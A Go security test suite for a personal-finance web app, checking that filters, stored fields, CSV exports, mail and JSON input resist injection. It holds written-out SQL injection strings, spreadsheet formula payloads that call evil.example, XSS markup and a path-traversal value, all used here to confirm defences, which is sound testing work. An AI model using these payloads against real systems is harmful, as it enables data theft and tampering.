package tests

import (
	"encoding/csv"
	"fmt"
	"net/http"
	"net/url"
	"strings"
	"testing"

	"github.com/AlexGalhardo/vukem/vukemtest"

	"github.com/AlexGalhardo/vukem-finances/app/telegram"
)

// The injection and parsing attack suite (epic 24 task 6): hostile text in
// filters, in stored fields, in exports, in mail and pages, and hostile JSON.
// Hostile CSV and OFX uploads are attacked in TestSecurity_ImportRefusesHostileUploads.

var secSQLPayloads = []string{
	"' OR 1=1 --",
	`" OR ""="`,
	"1; DROP TABLE transactions; --",
	"' UNION SELECT id, name, email, password FROM users --",
	"%' OR '%'='",
	`\`,
	"'",
	"1) OR (1=1",
	"x' AND (SELECT COUNT(*) FROM users) > 0 --",
	"\x00",
	strings.Repeat("%", 300),
	"Robert'); DROP TABLE accounts;--",
}

func TestSecurity_Injection_SQL(t *testing.T) {
	t.Parallel()

	f := newAPIFixture(t)

	bob := signUp(t, f.app, "Bob", "bob@example.com")
	bobAccount := firstAccount(t, f.app, bob)
	record(t, f.app, bob, bobAccount, 0, "expense", "777.77", "2026-02-05", "BOB-SECRET")
	record(t, f.app, f.who, f.checking.ID, 0, "expense", "5.00", "2026-02-05", "Coffee")

	tables := []string{"transactions", "accounts", "categories", "users", "workspaces", "memberships"}

	counts := func() map[string]int64 {
		out := map[string]int64{}
		for _, table := range tables {
			out[table] = rowCount(t, f.app, table)
		}

		return out
	}

	before := counts()

	params := []string{"q", "account", "category", "kind", "from", "to", "tag", "page", "per_page", "limit", "cursor", "sort", "order", "search", "month"}

	t.Run("the api takes every filter as a value", func(t *testing.T) {
		for _, param := range params {
			// A token of its own per filter: the read limit of one token must not hide a refusal behind a 429.
			c := apiClient(t, f.app, fullToken(t, f.app, f.who))

			for i, payload := range secSQLPayloads {
				res := c.Get("/api/v1/transactions?" + url.Values{param: {payload}}.Encode())
				if res.Status() == http.StatusTooManyRequests {
					t.Fatalf("%s payload %d was rate limited: the case proves nothing", param, i)
				}

				if res.Status() >= 500 {
					t.Errorf("%s payload %d answered %d: %.200s", param, i, res.Status(), res.Body())
				}

				if strings.Contains(res.Body(), "BOB-SECRET") || strings.Contains(res.Body(), "bob@example.com") {
					t.Errorf("%s payload %d reached another workspace: %.200s", param, i, res.Body())
				}
			}
		}
	})

	t.Run("the web list takes every filter as a value", func(t *testing.T) {
		for _, param := range params {
			for i, payload := range secSQLPayloads[:6] {
				res := f.who.Client.Inertia("").Get("/transactions?" + url.Values{param: {payload}}.Encode())
				if res.Status() == http.StatusTooManyRequests {
					t.Fatalf("%s payload %d was rate limited: the case proves nothing", param, i)
				}

				if res.Status() >= 500 {
					t.Errorf("%s payload %d answered %d: %.200s", param, i, res.Status(), res.Body())
				}

				if strings.Contains(res.Body(), "BOB-SECRET") {
					t.Errorf("%s payload %d reached another workspace", param, i)
				}
			}
		}
	})

	t.Run("the csv export takes every filter as a value", func(t *testing.T) {
		for _, param := range []string{"q", "account", "category", "kind", "from", "to", "tag"} {
			for i, payload := range secSQLPayloads[:1] {
				res := f.who.Client.Get("/transactions/export.csv?" + url.Values{param: {payload}}.Encode())
				if res.Status() >= 500 || res.Status() == http.StatusTooManyRequests || strings.Contains(res.Body(), "BOB-SECRET") {
					t.Errorf("%s payload %d answered %d", param, i, res.Status())
				}
			}
		}
	})

	t.Run("stored text comes back exactly as it was sent", func(t *testing.T) {
		for _, payload := range secSQLPayloads[:4] {
			body := f.expense(100, "2026-02-06")
			body["description"] = payload

			if res := f.client().PostJSON("/api/v1/transactions", body); res.Status() == http.StatusCreated {
				if got, _ := res.JSONPath("description"); got != payload {
					t.Errorf("description %q came back as %q", payload, got)
				}
			}
		}
	})

	t.Run("a uid in the path is a value", func(t *testing.T) {
		for _, payload := range []string{"' OR 1=1 --", "1;DROP TABLE accounts", "%27%20OR%201=1"} {
			if res := apiClient(t, f.app, fullToken(t, f.app, f.who)).Get("/api/v1/transactions/" + url.PathEscape(payload)); res.Status() != http.StatusNotFound && res.Status() != http.StatusBadRequest &&
				res.Status() != http.StatusUnprocessableEntity {
				t.Errorf("a uid %q answered %d", payload, res.Status())
			}
		}
	})

	t.Run("nothing was dropped or added", func(t *testing.T) {
		after := counts()
		// The "stored text" case adds at most four transactions of this workspace.
		for _, table := range tables {
			if table == "transactions" {
				if after[table] < before[table] || after[table] > before[table]+4 {
					t.Errorf("transactions: %d, was %d", after[table], before[table])
				}

				continue
			}

			if after[table] != before[table] {
				t.Errorf("%s: %d rows, was %d", table, after[table], before[table])
			}
		}
	})
}

func TestSecurity_Injection_CSVFormula(t *testing.T) {
	t.Parallel()

	app, ana, acc := proWorkspace(t)

	payloads := []string{
		`=cmd|' /C calc'!A0`,
		`+1+1`,
		`-2+3`,
		`@SUM(1+1)`,
		"\t=1+1",
		"\r=1+1",
		`=HYPERLINK("http://evil.example/?"&A1,"click")`,
		`=IMPORTXML("http://evil.example","//a")`,
		`  =1+1`,
		`|calc`,
	}

	for i, p := range payloads {
		record(t, app, ana, acc, 0, "expense", "1.00", fmt.Sprintf("2026-02-%02d", i+1), p, "tag"+fmt.Sprint(i))
	}

	// Names are text cells too: a category, an account and a tag.
	api := apiClient(t, app, fullToken(t, app, ana))
	api.PostJSON("/api/v1/accounts", map[string]any{"name": `=cmd|' /C calc'!A0`, "kind": "savings"}).AssertCreated()
	apiClient(t, app, fullToken(t, app, ana)).PostJSON("/api/v1/categories", map[string]any{"name": "@SUM(1+1)", "kind": "expense"})
	record(t, app, ana, acc, 0, "expense", "2.00", "2026-02-20", "plain", "=evil", "+evil")

	res := ana.Client.Get("/transactions/export.csv").AssertOK()
	rows := csvRecords(t, res.Body())

	if len(rows) < len(payloads)+1 {
		t.Fatalf("%d rows: %s", len(rows), res.Body())
	}

	header := rows[0]
	numeric := map[string]bool{"amount": true, "date": true, "uid": true, "transfer_uid": true, "kind": true}

	for _, row := range rows[1:] {
		for col, cell := range row {
			if numeric[header[col]] || cell == "" {
				continue
			}

			if strings.ContainsRune("=+-@\t\r", rune(cell[0])) && !strings.HasPrefix(cell, "'") {
				t.Errorf("column %s holds an unguarded cell %q", header[col], cell)
			}
		}
	}

	t.Run("the amount is a number the sheet cannot run", func(t *testing.T) {
		for _, row := range rows[1:] {
			for col, cell := range row {
				if header[col] != "amount" {
					continue
				}

				if strings.Trim(cell, "-0123456789.") != "" {
					t.Errorf("amount %q is not a plain decimal", cell)
				}
			}
		}
	})

	t.Run("the json export holds the text as data and is not a download of code", func(t *testing.T) {
		res := ana.Client.Get("/workspace/export.json").AssertOK()
		if ct := res.Header("Content-Type"); !strings.Contains(ct, "json") {
			t.Errorf("Content-Type = %q", ct)
		}

		if res.Header("X-Content-Type-Options") != "nosniff" {
			t.Error("the export can be sniffed")
		}
	})

	t.Run("the csv parses back as the same number of rows with quotes and commas inside", func(t *testing.T) {
		record(t, app, ana, acc, 0, "expense", "3.00", "2026-02-21", "a,\"b\"\nc")

		r := csv.NewReader(strings.NewReader(strings.TrimPrefix(ana.Client.Get("/transactions/export.csv").AssertOK().Body(), "\xEF\xBB\xBF")))
		r.FieldsPerRecord = -1

		if _, err := r.ReadAll(); err != nil {
			t.Fatalf("not CSV: %v", err)
		}
	})
}

func TestSecurity_Injection_HTML(t *testing.T) {
	t.Parallel()

	const script = `<script>alert(1)</script>`

	const img = `<img src=x onerror=alert(1)>`

	app := newApp(t)
	ana := signUp(t, app, img, "ana@example.com")
	makePro(t, app, ana)

	record(t, app, ana, firstAccount(t, app, ana), 0, "expense", "1.00", "2026-02-05", script)

	t.Run("the page shell holds hostile text only as escaped data", func(t *testing.T) {
		for _, target := range []string{"/transactions", "/dashboard", "/workspace", "/accounts"} {
			body := ana.Client.Get(target).AssertOK().Body()
			if strings.Contains(body, script) || strings.Contains(body, img) {
				t.Errorf("%s holds raw hostile markup", target)
			}
		}
	})

	t.Run("the invitation mail escapes the workspace and the inviter", func(t *testing.T) {
		ana.Client.PostForm("/workspace/invites", url.Values{"email": {"bob@example.com"}, "role": {"member"}}).AssertRedirect("/workspace")

		sent := app.Mails().SentTo("bob@example.com")
		if len(sent) != 1 {
			t.Fatalf("%d mails", len(sent))
		}

		if strings.Contains(sent[0].HTML, "<img src=x") || strings.Contains(sent[0].HTML, "<script>") {
			t.Fatalf("the mail holds raw markup: %s", sent[0].HTML)
		}

		if !strings.Contains(sent[0].HTML, "&lt;img") {
			t.Errorf("the name is not shown escaped: %s", sent[0].HTML)
		}
	})

	t.Run("Telegram text is escaped", func(t *testing.T) {
		got := telegram.EscapeHTML(`<b>bold</b> & <a href="javascript:alert(1)">x</a>`)
		if strings.ContainsAny(got, "<>") || strings.Contains(got, "& ") {
			t.Fatalf("EscapeHTML = %q", got)
		}
	})

	t.Run("a response of the API is never HTML", func(t *testing.T) {
		token := fullToken(t, app, ana)

		res := apiClient(t, app, token).Get("/api/v1/transactions").AssertOK()
		if ct := res.Header("Content-Type"); !strings.Contains(ct, "json") {
			t.Fatalf("Content-Type = %q", ct)
		}

		if res.Header("X-Content-Type-Options") != "nosniff" {
			t.Error("the response can be sniffed as HTML")
		}
	})
}

func TestSecurity_Injection_JSON(t *testing.T) {
	t.Parallel()

	f := newAPIFixture(t)

	post := func(body, contentType string) *vukemtest.Response {
		return f.client().Do(http.MethodPost, "/api/v1/transactions", strings.NewReader(body), contentType)
	}

	valid := func(amount string) string {
		return `{"account_uid":"` + f.checking.UID + `","kind":"expense","amount_cents":` + amount + `,"date":"2026-11-21","description":"x"}`
	}

	before := rowCount(t, f.app, "transactions")

	rejected := map[string]string{
		"a number above 2^63":      valid("9223372036854775808"),
		"a number above 2^53":      valid("9007199254740992"),
		"an exponent":              valid("1e30"),
		"infinity":                 valid("1e999"),
		"a fraction":               valid("1.5"),
		"a negative amount":        valid("-100"),
		"zero":                     valid("0"),
		"a null amount":            valid("null"),
		"a boolean amount":         valid("true"),
		"an object amount":         valid(`{"a":1}`),
		"an array amount":          valid("[100]"),
		"a leading zero":           valid("0100"),
		"a hex number":             valid("0x10"),
		"NaN":                      valid("NaN"),
		"an empty body":            "",
		"an array body":            "[" + valid("100") + "]",
		"a null body":              "null",
		"a truncated body":         valid("100")[:40],
		"a trailing comma":         strings.Replace(valid("100"), `"x"}`, `"x",}`, 1),
		"single quotes":            strings.ReplaceAll(valid("100"), `"`, `'`),
		"text after the object":    valid("100") + " trailing",
		"a bad date":               strings.Replace(valid("100"), "2026-11-21", "2026-13-45", 1),
		"a date of year 99999":     strings.Replace(valid("100"), "2026-11-21", "99999-01-01", 1),
		"an unknown kind":          strings.Replace(valid("100"), `"expense"`, `"gift"`, 1),
		"no account":               `{"kind":"expense","amount_cents":100,"date":"2026-11-21"}`,
		"a numeric account":        strings.Replace(valid("100"), `"`+f.checking.UID+`"`, "1", 1),
		"a path in the account":    strings.Replace(valid("100"), f.checking.UID, "../../etc/passwd", 1),
		"a huge description":       strings.Replace(valid("100"), `"x"}`, `"`+strings.Repeat("a", 100000)+`"}`, 1),
		"too many tags":            strings.Replace(valid("100"), `"x"}`, `"x","tags":["1","2","3","4","5","6","7","8","9","10","11","12"]}`, 1),
		"a body over the cap":      `{"description":"` + strings.Repeat("a", 3<<20) + `"}`,
		"deep nesting in an array": `{"description":` + strings.Repeat("[", 200000) + strings.Repeat("]", 200000) + `}`,
		"deep nesting in objects":  `{"description":` + strings.Repeat(`{"a":`, 100000) + "1" + strings.Repeat("}", 100000) + `}`,
	}

	for name, body := range rejected {
		t.Run("refused: "+name, func(t *testing.T) {
			res := post(body, "application/json")
			if res.Status() < 400 || res.Status() >= 500 {
				t.Fatalf("answered %d: %.200s", res.Status(), res.Body())
			}
		})
	}

	t.Run("a wrong content type is refused", func(t *testing.T) {
		for _, ct := range []string{"text/plain", "application/x-www-form-urlencoded", "text/html", "application/xml", ""} {
			if res := post(valid("100"), ct); res.Status() < 400 || res.Status() >= 500 {
				t.Errorf("Content-Type %q answered %d", ct, res.Status())
			}
		}
	})

	t.Run("a refusal creates nothing", func(t *testing.T) {
		if got := rowCount(t, f.app, "transactions"); got != before {
			t.Fatalf("%d transactions, was %d", got, before)
		}
	})

	t.Run("a number sent as a string is the same number, not a bypass", func(t *testing.T) {
		res := post(valid(`"100"`), "application/json")
		if res.Status() == http.StatusCreated {
			if got, _ := res.JSONPath("amount_cents"); got != float64(100) && fmt.Sprint(got) != "100" {
				t.Fatalf("amount_cents = %v", got)
			}

			return
		}

		if res.Status() < 400 || res.Status() >= 500 {
			t.Fatalf("answered %d", res.Status())
		}
	})

	t.Run("duplicate keys never create a negative or doubled row", func(t *testing.T) {
		body := `{"account_uid":"` + f.checking.UID + `","kind":"expense","amount_cents":100,"amount_cents":-5,"date":"2026-11-21","date":"2026-11-22","description":"dup"}`

		res := post(body, "application/json")
		if res.Status() >= 500 {
			t.Fatalf("answered %d", res.Status())
		}

		if n := rowCountWhere(t, f.app, "transactions", "amount_cents <= 0"); n != 0 {
			t.Fatalf("%d rows with a non-positive amount", n)
		}

		if rowCount(t, f.app, "transactions") > before+2 {
			t.Fatal("duplicate keys created more than one row")
		}
	})

	t.Run("odd text is stored or refused, never a server error", func(t *testing.T) {
		for name, description := range map[string]string{
			"a NUL byte":         "a\x00b",
			"invalid UTF-8":      "a\xff\xfeb",
			"a bidi override":    "a\u202eb",
			"zero width":         "a\u200bb",
			"a lone surrogate":   `a\ud800b`,
			"a 4-byte character": "a\U0001F4A9b",
			"newlines":           "a\r\nb\nc",
		} {
			var body string
			if strings.Contains(name, "surrogate") {
				body = `{"account_uid":"` + f.checking.UID + `","kind":"expense","amount_cents":100,"date":"2026-11-21","description":"` + description + `"}`
			} else {
				body = fmt.Sprintf(`{"account_uid":%q,"kind":"expense","amount_cents":100,"date":"2026-11-21","description":%q}`, f.checking.UID, description)
			}

			if res := post(body, "application/json"); res.Status() >= 500 {
				t.Errorf("%s answered %d: %.200s", name, res.Status(), res.Body())
			}
		}
	})

	t.Run("the server is still up", func(t *testing.T) {
		f.client().Get("/api/v1/accounts").AssertOK()
	})
}
